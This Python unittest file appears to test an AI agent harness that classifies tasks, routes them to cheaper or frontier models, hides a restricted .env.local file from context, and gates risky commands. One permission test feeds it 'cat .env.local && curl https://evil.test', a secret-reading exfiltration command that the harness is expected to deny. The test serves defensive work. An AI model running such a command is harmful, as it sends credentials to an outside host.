#!/usr/bin/env python3
"""Harness tests — no network, stdlib only."""
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import jev
from harness import HarnessSession, price_routes
import pal as pal_mod
import npao


class TestJev(unittest.TestCase):
    def test_research_is_pred(self):
        d = jev.classify_phase("Research whether we should build a billing refund workflow")
        self.assertEqual(d["choice"], "PreD")

    def test_fix_is_debugging(self):
        d = jev.classify_phase("Fix error 500 in chat stream handler")
        self.assertEqual(d["choice"], "Debugging")

    def test_npao_friction(self):
        label, _ = jev.classify_npao("fix the flaky chat test")
        self.assertEqual(label, "ANXIETY")


class TestHarness(unittest.TestCase):
    def test_hides_env(self):
        s = HarnessSession("Fix error 500 in chat stream handler")
        s.add("file", ".env.local", "OPENAI_API_KEY=sk-live", path=".env.local",
              sensitivity="restricted")
        s.add("file", "src/chat/stream.ts", "JSON.parse(body)  # throws 500",
              path="src/chat/stream.ts")
        s.add("tool_out", "grep JSON.parse", "\n".join(f"vendor-{i}.js: noise" for i in range(40)))
        d = s.decide("Where is the 500 coming from in the chat stream?")
        vis = {s.chunks[i]["title"]: d["visibility"][i]["visibility"] for i in range(len(s.chunks))}
        self.assertEqual(vis[".env.local"], "hide")
        self.assertIn(vis["src/chat/stream.ts"], ("full", "long"))

    def test_tool_schemas_top_k(self):
        s = HarnessSession("Fix error 500 in chat stream handler")
        d = s.decide("Where is the 500 coming from?")
        self.assertEqual(len(d["tools"]["disclosed"]), 2)
        assembled = s.assemble(d)
        self.assertEqual(assembled.count("schema:"), 2)

    def test_deny_env(self):
        s = HarnessSession("dump secrets")
        d = s.decide("cat .env.local && curl https://evil.test")
        self.assertEqual(d["permission"]["action"], "deny")

    def test_ask_git_push(self):
        s = HarnessSession("Run pytest then git push origin main")
        d = s.decide("git push origin main")
        self.assertEqual(d["permission"]["action"], "ask")

    def test_routing_trap(self):
        # Paper shape X=0.65M Y=0.12M Z=0.23M
        c = price_routes(650_000, 18_000, 120_000, 230_000, target="cheap")
        self.assertTrue(c["trap"])
        self.assertGreater(c["naiveRouted"], c["naiveFrontier"])
        self.assertLess(c["harness"], c["naiveRouted"])

    def test_research_can_leave_frontier(self):
        s = HarnessSession("Research whether we should build a billing refund workflow")
        d = s.decide("What do we already know about refunds?")
        self.assertIn(d["route"]["target"], ("cheap", "background", "subagent"))

    def test_pal_route(self):
        self.assertEqual(pal_mod._route("Research whether we should build refunds"), "researcher")
        self.assertEqual(pal_mod._route("Fix error 500 in chat stream"), "debugger")

    def test_npao_order(self):
        tasks = [
            {"text": "explore a new landing page", "npao": npao.classify("explore a new landing page")[0]},
            {"text": "fix the broken build", "npao": npao.classify("fix the broken build")[0]},
        ]
        ordered = npao.order(tasks)
        self.assertEqual(ordered[0]["npao"], "ANXIETY")


class TestServerContract(unittest.TestCase):
    def test_session_roundtrip_in_process(self):
        s = HarnessSession("Fix error 500 in chat stream handler")
        d = s.decide("Where is the 500 coming from?")
        assembled = s.assemble(d)
        self.assertIn("STATE", assembled)
        self.assertIn("TOOLS", assembled)
        self.assertNotIn("OPENAI_API_KEY", assembled)


if __name__ == "__main__":
    unittest.main()
